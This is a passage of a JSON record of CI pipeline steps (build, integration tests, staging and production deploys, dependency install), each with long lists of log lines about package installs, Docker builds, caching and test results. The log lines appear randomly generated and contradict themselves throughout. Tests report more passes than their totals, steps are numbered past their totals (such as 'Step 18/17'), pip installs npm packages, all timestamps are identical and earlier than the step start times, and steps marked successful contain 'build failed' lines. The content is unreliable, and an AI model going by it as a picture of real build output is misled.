          "Bundling main.css",
          "Step 6/19: Deploying",
          "npm notice: package.json updated",
          "[12:46:10] INFO: Processing request",
          "Using Node.js 16.7.7",
          "Cache restored successfully (24MB)",
          "Completed.",
          "GET /health - 201 (5ms)",
          "POST /upload - 202 (180ms)",
          "Loading...",
          "Fetching submodules...",
          "[12:46:10] DEBUG: Query executed in 51ms",
          "  PASS: e2e/test_user_create.spec.js",
          "Transforming 810 files...",
          "Cache restored successfully (370MB)",
          "npm notice: package.json updated",
          "[12:46:10] WARN: Deprecated API usage",
          "Coverage: 97% statements, 92% branches",
          "Cache hit for key-7563",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Processing...",
          "Pushing to registry...",
          "Compiling utils/handler.rs...",
          "HEAD is now at 918df3e",
          "Artifact uploaded: dist.zip (41MB)",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "OK",
          "Cache hit for key-5129",
          "[12:46:10] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 64b8374",
          "Uploading artifact 'build' (31 files)",
          "[12:46:10] INFO: Connecting to database",
          "GET /api - 204 (65ms)",
          "Creating production build...",
          "Artifact uploaded: dist.zip (90MB)",
          "Using Node.js 16.19.9",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] WARN: Deprecated API usage",
          "Loading...",
          "Cache invalidated: dependencies",
          "Pulling image: python:latest",
          "Cache invalidated: build",
          "Verifying...",
          "npm install: added 292 packages",
          "Checking out main branch",
          "Step 16/20: Running migrations",
          "pip: Collecting lodash",
          "Transforming 412 files...",
          "Transforming 951 files...",
          "[12:46:10] ERROR: Connection failed",
          "pip: Downloading react-4.18.tar.gz",
          "npm install: added 51 packages",
          "npm install: resolved 1951 packages",
          "POST /api - 200 (296ms)",
          "Snapshots: 30 passed, 8 total",
          "Already up to date.",
          "[12:46:10] WARN: Deprecated API usage",
          "Snapshots: 3 passed, 34 total",
          "Uploading artifact 'build' (25 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "Step 4/17: Testing",
          "npm notice: package.json updated",
          "Cache restored successfully (403MB)",
          "Fetching from https://amazonaws.com/package.json",
          "Environment: development",
          "Completed.",
          "Image pulled successfully",
          "Artifact downloaded: 19MB",
          "Building Docker image...",
          "Step 15/15: Running migrations",
          "  PASS: test_cache_hit (441ms)",
          "Tests: 52 passed, 150 total",
          "[12:46:10] DEBUG: Query executed in 94ms",
          "\u2713 package completed",
          "Compiling src/index.js...",
          "Artifact downloaded: 6MB",
          "Artifact uploaded: dist.zip (24MB)",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (33MB)",
          "npm install: resolved 1383 packages",
          "[12:46:10] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Installing webpack@2.11.6",
          "Success!",
          "Artifact downloaded: 50MB",
          "Artifact uploaded: dist.zip (17MB)",
          "Environment: test",
          "\u2717 build failed with exit code 12",
          "Step 9/25: Testing",
          "Cache invalidated: build",
          "[12:46:10] DEBUG: Query executed in 68ms",
          "pip: Installing build dependencies...",
          "\u2713 lint completed",
          "Already up to date.",
          "Artifact downloaded: 23MB",
          "npm install: resolved 1509 packages",
          "  PASS: unit/test_db_connect.spec.js",
          "Cache hit for key-3790",
          "Cache invalidated: build",
          "Completed.",
          "[12:46:10] INFO: Request completed",
          "Artifact uploaded: dist.zip (73MB)",
          "[12:46:10] INFO: Processing request",
          "[12:46:10] INFO: Cache refreshed",
          "[12:46:10] INFO: Cache refreshed",
          "Loading...",
          "HEAD is now at 39cb664",
          "[12:46:10] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 3847ms",
          "Environment: test",
          "Generating source maps...",
          "[12:46:10] DEBUG: Connection pool: 17 active",
          "\u2713 All checks passed",
          "POST /upload - 201 (270ms)",
          "Tests: 80 passed, 415 total",
          "npm install: resolved 350 packages",
          "Cache hit for key-1706",
          "Artifact uploaded: dist.zip (67MB)",
          "Generating source maps...",
          "Compiling lib/main.py...",
          "Processing...",
          "Layer 10/13: ENV command",
          "pip install: Successfully installed webpack-1.6",
          "Processing...",
          "Step 10/20: Installing dependencies",
          "  PASS: e2e/test_api_health.spec.js",
          "Step 10/18: Running migrations",
          "Switched to branch 'hotfix/task-519'",
          "Step 16/18: Building",
          "Using Python 3.10",
          "Checking out master branch",
          "Pulling image: python:18",
          "Compiling src/index.js...",
          "Ran 195 tests in 18s",
          "npm install: added 135 packages",
          "Optimizing 20 modules...",
          "\u2713 Task completed in 4650ms",
          "Already up to date.",
          "Cache invalidated: build",
          "Step 2/22: Building",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://gcr.io/package.json",
          "Minifying app.js",
          "Done.",
          "OK",
          "Cache restored successfully (123MB)",
          "[12:46:10] INFO: Starting build process",
          "  PASS: test_user_create (29ms)",
          "pip install: Successfully installed webpack-4.15",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:47:19.795050",
        "finished_at": "2025-12-04T12:47:43.008804",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:46:10] DEBUG: Initializing service",
          "pip install: Successfully installed axios-2.20",
          "Snapshots: 45 passed, 17 total",
          "Compiling utils/app.ts...",
          "Checking out develop branch",
          "Installing webpack@5.3.8",
          "npm install: added 239 packages",
          "[12:46:10] DEBUG: Memory usage: 1133MB",
          "Artifact downloaded: 50MB",
          "Ready.",
          "\u2713 validate completed",
          "Already up to date.",
          "Minifying vendor.js",
          "Cache miss for key-6735",
          "FAILED: test_cache_hit",
          "Tests: 239 passed, 74 total",
          "Generating source maps...",
          "Test Suites: 12 passed, 49 total",
          "GET /health - 201 (8ms)",
          "Optimizing 43 modules...",
          "  PASS: test_user_create (185ms)",
          "Compiling utils/handler.rs...",
          "Transforming 856 files...",
          "Time: 79.584s",
          "Ran 22 tests in 37s",
          "Compiling lib/app.ts...",
          "Step 11/15: Running migrations",
          "Checking out main branch",
          "[12:46:10] INFO: Connecting to database",
          "Step 17/18: Testing",
          "[12:46:10] DEBUG: Connection pool: 12 active",
          "HEAD is now at bb1ddbe",
          "[12:46:10] ERROR: Connection failed",
          "Installing webpack@3.14.4",
          "Layer 8/12: COPY command",
          "HEAD is now at 8805472",
          "Success!",
          "Optimizing 29 modules...",
          "Environment: test",
          "[12:46:10] INFO: Connecting to database",
          "Coverage: 77% statements, 75% branches",
          "Building Docker image...",
          "Generating source maps...",
          "Building Docker image...",
          "pip: Collecting jest",
          "Waiting...",
          "Waiting...",
          "Test Suites: 10 passed, 39 total",
          "Compiling lib/service.java...",
          "Fetching from https://npmjs.org/package.json",
          "pip install: Successfully installed prettier-5.0",
          "Image pulled successfully",
          "[12:46:10] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "Layer 6/9: RUN command",
          "TLS handshake completed",
          "Cache miss for key-5189",
          "npm notice: created a lockfile",
          "  PASS: test_db_connect (314ms)",
          "GET /health - 201 (8ms)",
          "Platform: linux-x64",
          "Optimizing 98 modules...",
          "Using Python 3.12",
          "\u2713 build completed",
          "Installing jest@2.17.7",
          "TLS handshake completed",
          "Already up to date.",
          "Cache miss for key-9461",
          "Loading...",
          "Uploading artifact 'dist' (1 files)",
          "\u2713 package completed",
          "POST /upload - 200 (498ms)",
          "npm install: added 424 packages",
          "NODE_ENV=development",
          "Already up to date.",
          "Tests: 425 passed, 180 total",
          "\u2713 All checks passed",
          "Compiling lib/utils.go...",
          "Generating source maps...",
          "[12:46:10] INFO: Starting build process",
          "Success!",
          "Compiling lib/utils.go...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_auth_login (289ms)",
          "Waiting...",
          "Compiling lib/utils.go...",
          "[12:46:10] DEBUG: Initializing service",
          "Installing eslint@2.8.4",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'feature/task-168'",
          "Loading...",
          "Ready.",
          "Ready.",
          "Cache saved successfully",
          "  PASS: e2e/test_user_create.spec.js",
          "Generating source maps...",
          "pip: Downloading lodash-4.8.tar.gz",
          "pip: Downloading jest-4.16.tar.gz",
          "Cache restored successfully (297MB)",
          "Compiling utils/main.py...",
          "Time: 104.430s",
          "Layer 6/12: COPY command",
          "Environment: test",
          "[12:46:10] INFO: Connecting to database",
          "Artifact downloaded: 19MB",
          "Cache miss for key-8339",
          "Transforming 238 files...",
          "Processing...",
          "pip: Collecting react",
          "\u2713 test completed",
          "Success!",
          "Cache invalidated: node_modules",
          "Using Python 3.10",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] DEBUG: Loading configuration",
          "Cache hit for key-2413",
          "Artifact uploaded: dist.zip (10MB)",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] ERROR: Connection failed",
          "Building Docker image...",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Connection established",
          "POST /upload - 200 (205ms)",
          "Generating source maps...",
          "Checking out develop branch",
          "[12:46:10] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (63MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Tests: 358 passed, 174 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "Finished.",
          "POST /api - 201 (443ms)",
          "Pushing to registry...",
          "Image pulled successfully",
          "pip: Downloading eslint-5.15.tar.gz",
          "npm install: resolved 913 packages",
          "Processing...",
          "Image pulled successfully",
          "Snapshots: 15 passed, 10 total",
          "Step 18/17: Deploying",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "POST /upload - 202 (424ms)",
          "[12:46:10] DEBUG: Loading configuration",
          "Optimizing 40 modules...",
          "Transforming 876 files...",
          "OK",
          "[12:46:10] INFO: Processing request",
          "Step 9/22: Running migrations",
          "Cache hit for key-6383",
          "Cache restored successfully (440MB)",
          "Switched to branch 'hotfix/task-729'",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "Finished.",
          "[12:46:10] DEBUG: Loading configuration",
          "Fetching submodules...",
          "pip: Collecting react",
          "Test Suites: 7 passed, 37 total",
          "[12:46:10] DEBUG: Query executed in 80ms",
          "Environment: production",
          "\u2713 Step 'test' succeeded",
          "Switched to branch 'feature/task-834'",
          "pip: Collecting axios",
          "Fetching from https://githubusercontent.com/package.json",
          "\u2713 Task completed in 2446ms",
          "Step 7/24: Building",
          "npm install: added 397 packages",
          "Optimizing 34 modules...",
          "Cache restored successfully (133MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Waiting...",
          "WARNING: react has known vulnerabilities",
          "GET /status - 201 (55ms)",
          "[12:46:10] INFO: Connecting to database",
          "Compiling src/main.py...",
          "[12:46:10] DEBUG: Loading configuration",
          "Verifying...",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 26",
          "pip install: Successfully installed prettier-4.2",
          "pip: Installing build dependencies...",
          "Cache miss for key-7370",
          "TLS handshake completed",
          "Step 7/23: Deploying",
          "yarn add: Done in 25.55s",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/service.java...",
          "Cache hit for key-7099",
          "[12:46:10] INFO: Starting build process",
          "FAILED: test_cache_hit",
          "Compiling src/index.js...",
          "Transforming 269 files...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:47:43.008804",
        "finished_at": "2025-12-04T12:47:54.615681",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 17/20: Testing",
          "Layer 9/13: COPY command",
          "Already up to date.",
          "[12:46:10] INFO: Request completed",
          "Artifact downloaded: 32MB",
          "Artifact uploaded: build.tar.gz (48MB)",
          "npm notice: package.json updated",
          "Completed.",
          "Step 14/18: Linting",
          "Cache saved successfully",
          "HEAD is now at babd499",
          "[12:46:10] DEBUG: Memory usage: 560MB",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "[12:46:10] INFO: Processing request",
          "Switched to branch 'bugfix/task-839'",
          "Cache invalidated: node_modules",
          "Snapshots: 38 passed, 43 total",
          "Cache miss for key-4799",
          "Step 6/16: Deploying",
          "Waiting...",
          "Pulling image: alpine:18",
          "\u2713 Task completed in 315ms",
          "[12:46:10] INFO: Request completed",
          "Exception: NullPointerException",
          "  PASS: test_user_create (155ms)",
          "Coverage: 78% statements, 74% branches",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] DEBUG: Loading configuration",
          "Cache saved successfully",
          "[12:46:10] DEBUG: Query executed in 36ms",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Transforming 469 files...",
          "  PASS: test_auth_login (353ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: staging",
          "[12:46:10] WARN: Deprecated API usage",
          "Tests: 258 passed, 355 total",
          "Success!",
          "pip: Downloading lodash-1.13.tar.gz",
          "[12:46:10] ERROR: Connection failed",
          "Transforming 197 files...",
          "Minifying vendor.js",
          "Pulling image: python:3.11",
          "Completed.",
          "Environment: test",
          "Installing axios@3.3.0",
          "Cache hit for key-1098",
          "yarn add: Done in 9.84s",
          "[12:46:10] DEBUG: Initializing service",
          "TLS handshake completed",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "[12:46:10] WARN: Deprecated API usage",
          "pip install: Successfully installed prettier-2.4",
          "Test Suites: 22 passed, 12 total",
          "Ran 192 tests in 4s",
          "Using Python 3.11",
          "[12:46:10] DEBUG: Initializing service",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "OK",
          "[12:46:10] DEBUG: Query executed in 27ms",
          "[12:46:10] INFO: Connecting to database",
          "Step 4/16: Linting",
          "Building Docker image...",
          "\u2713 Step 'build' succeeded",
          "Time: 43.340s",
          "Minifying main.js",
          "[12:46:10] DEBUG: Query executed in 83ms",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: dist.zip (31MB)",
          "Platform: win32-x64",
          "Fetching from https://googleapis.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@1.14.9",
          "NODE_ENV=production",
          "Checking out develop branch",
          "Layer 1/13: ENV command",
          "Tests: 180 passed, 145 total",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "Ran 121 tests in 42s",
          "Fetching submodules...",
          "FAILED: test_user_create",
          "Time: 20.143s",
          "Cache miss for key-2554",
          "Tests: 394 passed, 436 total",
          "[12:46:10] DEBUG: Initializing service",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] DEBUG: Memory usage: 396MB",
          "Step 13/19: Building",
          "Bundling runtime.js",
          "Done.",
          "Creating production build...",
          "Compiling utils/service.java...",
          "Compiling components/index.js...",
          "Switched to branch 'bugfix/task-237'",
          "Image pulled successfully",
          "NODE_ENV=development",
          "Cache miss for key-2990",
          "POST /data - 202 (78ms)",
          "pip: Downloading lodash-1.6.tar.gz",
          "\u2713 Step 'checkout' succeeded",
          "yarn add: Done in 20.18s",
          "Verifying...",
          "Cache miss for key-1668",
          "Loading...",
          "Step 16/15: Linting",
          "[12:46:10] DEBUG: Loading configuration",
          "Environment: production",
          "OK",
          "NODE_ENV=production",
          "Transforming 287 files...",
          "HEAD is now at baf7db1",
          "Environment: production",
          "[12:46:10] INFO: Cache refreshed",
          "HEAD is now at b68609d",
          "Step 9/15: Running migrations",
          "Compiling lib/handler.rs...",
          "Compiling lib/main.py...",
          "Using Node.js 16.16.4",
          "[12:46:10] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:10] DEBUG: Memory usage: 1188MB",
          "Done.",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 9/22: Building",
          "Step 14/15: Running migrations",
          "Cache hit for key-8034",
          "Checking out main branch",
          "Platform: win32-x64",
          "Using Python 3.9",
          "[12:46:10] DEBUG: Memory usage: 1024MB",
          "Cache miss for key-2507",
          "Cache invalidated: build",
          "yarn add: Done in 3.99s",
          "  PASS: e2e/test_api_health.spec.js",
          "  PASS: test_cache_hit (302ms)",
          "[12:46:10] DEBUG: Query executed in 63ms",
          "OK",
          "Environment: staging",
          "Minifying vendor.js",
          "POST /data - 202 (77ms)",
          "Completed.",
          "npm install: added 408 packages",
          "Building Docker image...",
          "Completed.",
          "Processing...",
          "[12:46:10] DEBUG: Initializing service",
          "Cache invalidated: dependencies",
          "[12:46:10] DEBUG: Initializing service",
          "FAILED: test_auth_login",
          "Creating production build...",
          "[12:46:10] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Snapshots: 3 passed, 45 total",
          "Ready.",
          "Finished.",
          "Tests: 224 passed, 371 total",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 77",
          "pip: Installing build dependencies...",
          "[12:46:10] ERROR: Connection failed",
          "Cache miss for key-4027",
          "Optimizing 26 modules...",
          "pip: Collecting jest",
          "Step 17/16: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:10] WARN: Deprecated API usage",
          "Loading...",
          "Waiting...",
          "Snapshots: 48 passed, 24 total",
          "[12:46:10] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "Done.",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] DEBUG: Memory usage: 1798MB",
          "HEAD is now at 8b0855d",
          "npm install: resolved 506 packages",
          "Waiting...",
          "Cache invalidated: build",
          "Waiting...",
          "Step 16/24: Running migrations",
          "[12:46:10] DEBUG: Connection pool: 18 active",
          "npm notice: created a lockfile",
          "Coverage: 86% statements, 94% branches",
          "[12:46:10] ERROR: Connection failed",
          "Using Node.js 18.7.3",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:10] INFO: Cache refreshed",
          "npm install: resolved 1122 packages",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Starting build process",
          "Layer 3/11: RUN command",
          "Ready.",
          "Ready.",
          "Success!",
          "Finished.",
          "Using Python 3.9",
          "OK",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:47:54.615681",
        "finished_at": "2025-12-04T12:47:59.258432",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Pushing to registry...",
          "[12:46:10] WARN: Deprecated API usage",
          "npm install: added 231 packages",
          "HEAD is now at 291e796",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Completed.",
          "[12:46:10] DEBUG: Query executed in 90ms",
          "Transforming 904 files...",
          "Test Suites: 38 passed, 41 total",
          "Pulling image: alpine:latest",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] WARN: Deprecated API usage",
          "Uploading artifact 'build' (37 files)",
          "Image pulled successfully",
          "Already up to date.",
          "[12:46:10] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-472'",
          "Ran 119 tests in 39s",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Finished.",
          "Done.",
          "WARNING: webpack has known vulnerabilities",
          "Minifying main.js",
          "Cache saved successfully",
          "[12:46:10] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (29 files)",
          "Cache restored successfully (452MB)",
          "Coverage: 79% statements, 85% branches",
          "Compiling utils/index.js...",
          "[12:46:10] DEBUG: Loading configuration",
          "Uploading artifact 'build' (14 files)",
          "Fetching submodules...",
          "POST /upload - 202 (213ms)",
          "Cache saved successfully",
          "[12:46:10] ERROR: Connection failed",
          "Creating production build...",
          "Artifact uploaded: dist.zip (3MB)",
          "Minifying app.js",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:10] INFO: Cache refreshed",
          "Cache restored successfully (150MB)",
          "[12:46:10] DEBUG: Initializing service",
          "Creating production build...",
          "Layer 8/11: COPY command",
          "pip: Installing build dependencies...",
          "Cache restored successfully (66MB)",
          "Using Node.js 20.14.6",
          "[12:46:10] DEBUG: Connection pool: 12 active",
          "Processing...",
          "npm notice: package.json updated",
          "HEAD is now at c84ef17",
          "Fetching from https://pypi.org/package.json",
          "Ran 119 tests in 16s",
          "Optimizing 14 modules...",
          "Step 16/21: Linting",
          "Cache saved successfully",
          "Already up to date.",
          "yarn add: Done in 20.47s",
          "POST /data - 202 (429ms)",
          "Cache invalidated: dependencies",
          "Pulling image: alpine:latest",
          "Artifact downloaded: 30MB",
          "Switched to branch 'feature/task-533'",
          "[12:46:10] WARN: Deprecated API usage",
          "OK",
          "HEAD is now at 65985e2",
          "Optimizing 41 modules...",
          "WARNING: lodash has known vulnerabilities",
          "Ready.",
          "Step 5/24: Testing",
          "Step 10/24: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing eslint@2.19.6",
          "Cache miss for key-4247",
          "Done.",
          "\u2713 lint completed",
          "Connection established",
          "[12:46:10] DEBUG: Loading configuration",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Step 20/23: Deploying",
          "Artifact uploaded: dist.zip (97MB)",
          "Coverage: 99% statements, 90% branches",
          "[12:46:10] INFO: Request completed",
          "Step 14/24: Testing",
          "Time: 66.535s",
          "NODE_ENV=development",
          "WARNING: express has known vulnerabilities",
          "[12:46:10] INFO: Request completed",
          "Building Docker image...",
          "\u2713 Step 'test' succeeded",
          "Step 4/22: Running migrations",
          "Ran 134 tests in 15s",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (26MB)",
          "Done.",
          "Waiting...",
          "Transforming 636 files...",
          "[12:46:10] DEBUG: Connection pool: 19 active",
          "GET /api - 201 (31ms)",
          "Bundling styles.css",
          "Ran 200 tests in 11s",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 12/25: Testing",
          "HEAD is now at 24f63b1",
          "OK",
          "NODE_ENV=test",
          "Step 4/24: Deploying",
          "\u2717 build failed with exit code 116",
          "OK",
          "  PASS: test_auth_login (126ms)",
          "[12:46:10] DEBUG: Memory usage: 430MB",
          "[12:46:10] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Layer 3/11: COPY command",
          "Cache saved successfully",
          "\u2717 build failed with exit code 102",
          "Cache restored successfully (375MB)",
          "Installing eslint@2.13.8",
          "Time: 46.840s",
          "Finished.",
          "Processing...",
          "\u2713 package completed",
          "[12:46:10] INFO: Starting build process",
          "Step 17/24: Linting",
          "pip: Installing build dependencies...",
          "Snapshots: 13 passed, 20 total",
          "pip install: Successfully installed express-5.12",
          "Step 12/15: Building",
          "[12:46:10] DEBUG: Memory usage: 725MB",
          "Cache miss for key-6680",
          "[12:46:10] DEBUG: Query executed in 42ms",
          "POST /data - 200 (278ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Test Suites: 22 passed, 17 total",
          "Cache restored successfully (390MB)",
          "Step 19/18: Building",
          "Environment: test",
          "[12:46:10] INFO: Cache refreshed",
          "[12:46:10] INFO: Connecting to database",
          "Compiling components/handler.rs...",
          "pip install: Successfully installed eslint-2.7",
          "pip install: Successfully installed prettier-1.20",
          "Cache hit for key-7749",
          "Cache miss for key-9070",
          "pip: Collecting axios",
          "Artifact downloaded: 17MB",
          "Step 20/23: Testing",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Platform: darwin-arm64",
          "Already up to date.",
          "Compiling lib/utils.go...",
          "Snapshots: 3 passed, 32 total",
          "Processing...",
          "Done.",
          "HEAD is now at 391fb19",
          "Step 4/19: Linting",
          "Ran 124 tests in 11s",
          "Step 14/22: Deploying",
          "Time: 11.548s",
          "yarn add: Done in 29.7s",
          "Step 10/24: Running migrations",
          "[12:46:10] DEBUG: Query executed in 92ms",
          "Step 4/24: Testing",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed webpack-3.20",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:10] DEBUG: Loading configuration",
          "\u2713 Task completed in 3687ms",
          "Tests: 202 passed, 55 total",
          "Waiting...",
          "pip: Collecting eslint",
          "Connection established",
          "Cache miss for key-5118",
          "yarn add: Done in 3.10s",
          "\u2713 Task completed in 876ms",
          "Finished.",
          "  PASS: unit/test_cache_hit.spec.js",
          "Time: 63.536s",
          "\u2713 test completed",
          "pip: Downloading react-1.5.tar.gz",
          "pip: Collecting express",
          "Switched to branch 'feature/task-678'",
          "[12:46:10] DEBUG: Query executed in 25ms",
          "Waiting...",
          "Snapshots: 33 passed, 38 total",
          "Pushing to registry...",
          "Pushing to registry...",
          "Fetching submodules...",
          "Step 3/23: Building",
          "Test Suites: 18 passed, 26 total",
          "Processing...",
          "NODE_ENV=development",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:10] DEBUG: Query executed in 85ms",
          "Creating production build...",
          "Optimizing 86 modules...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:47:59.258432",
        "finished_at": "2025-12-04T12:48:34.079063",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "pip: Downloading react-5.2.tar.gz",
          "Using Node.js 18.16.10",
          "Completed.",
          "\u2717 build failed with exit code 50",
          "Fetching submodules...",
          "pip: Collecting jest",
          "Optimizing 96 modules...",
          "FAILED: test_api_health",
          "HEAD is now at 2d99ed7",
          "Step 19/20: Testing",
          "Loading...",
          "WARNING: webpack has known vulnerabilities",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "Platform: linux-x64",
          "NODE_ENV=test",
          "Fetching from https://registry.npmjs.org/package.json",
          "Checking out master branch",
          "Loading...",
          "Step 14/19: Testing",
          "Bundling styles.css",
          "[12:46:10] WARN: Deprecated API usage",
          "Step 1/15: Running migrations",
          "Connection established",
          "Exception: NullPointerException",
          "[12:46:10] DEBUG: Initializing service",
          "  PASS: test_api_health (181ms)",
          "[12:46:10] INFO: Connecting to database",
          "Step 13/15: Testing",
          "Transforming 951 files...",
          "Snapshots: 2 passed, 0 total",
          "[12:46:10] INFO: Processing request",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Using Python 3.11",
          "HEAD is now at be305da",
          "\u2713 Task completed in 1042ms",
          "Completed.",
          "Loading...",
          "Installing jest@3.17.7",
          "Switched to branch 'hotfix/task-586'",
          "Done.",
          "Step 9/20: Deploying",
          "[12:46:10] ERROR: Connection failed",
          "\u2713 Task completed in 455ms",
          "WARNING: eslint has known vulnerabilities",
          "Bundling runtime.js",
          "npm notice: created a lockfile",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-7391",
          "Layer 2/11: RUN command",
          "Test Suites: 28 passed, 8 total",
          "Artifact downloaded: 44MB",
          "[12:46:10] WARN: Deprecated API usage",
          "Using Node.js 19.18.2",
          "Compiling src/main.py...",
          "pip: Collecting express",
          "[12:46:10] DEBUG: Connection pool: 3 active",
          "Compiling src/main.py...",
          "Snapshots: 40 passed, 25 total",
          "Building Docker image...",
          "Tests: 70 passed, 128 total",
          "Environment: staging",
          "Using Node.js 17.4.10",
          "[12:46:10] INFO: Request completed",
          "Cache invalidated: node_modules",
          "Cache restored successfully (14MB)",
          "Building Docker image...",
          "Uploading artifact 'build' (39 files)",
          "Loading...",
          "Artifact downloaded: 45MB",
          "  PASS: integration/test_db_connect.spec.js",
          "Platform: darwin-arm64",
          "Switched to branch 'hotfix/task-318'",
          "Processing...",
          "POST /data - 202 (21ms)",
          "[12:46:10] INFO: Request completed",
          "Completed.",
          "Connection established",
          "Exception: NullPointerException",
          "Processing...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 11/15: Building",
          "Step 16/19: Linting",
          "Pushing to registry...",
          "Pushing to registry...",
          "HEAD is now at 4f75bdc",
          "Step 5/22: Linting",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:10] DEBUG: Initializing service",
          "OK",
          "Switched to branch 'hotfix/task-881'",
          "Installing react@2.19.4",
          "Switched to branch 'feature/task-225'",
          "Platform: darwin-arm64",
          "Fetching submodules...",
          "[12:46:10] INFO: Connecting to database",
          "Installing eslint@4.11.0",
          "Switched to branch 'bugfix/task-163'",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 4910ms",
          "[12:46:10] INFO: Processing request",
          "Checking out master branch",
          "Compiling lib/utils.go...",
          "npm install: added 482 packages",
          "Artifact downloaded: 39MB",
          "pip: Collecting jest",
          "Cache invalidated: dependencies",
          "[12:46:10] DEBUG: Connection pool: 16 active",
          "Step 15/24: Testing",
          "Snapshots: 29 passed, 17 total",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] WARN: Deprecated API usage",
          "Environment: production",
          "Success!",
          "Step 16/15: Running migrations",
          "Compiling src/handler.rs...",
          "\u2713 All checks passed",
          "npm install: resolved 502 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at aa043f3",
          "Snapshots: 36 passed, 3 total",
          "Ran 143 tests in 59s",
          "Ready.",
          "\u2713 Task completed in 4475ms",
          "Fetching from https://googleapis.com/package.json",
          "pip: Downloading prettier-2.13.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
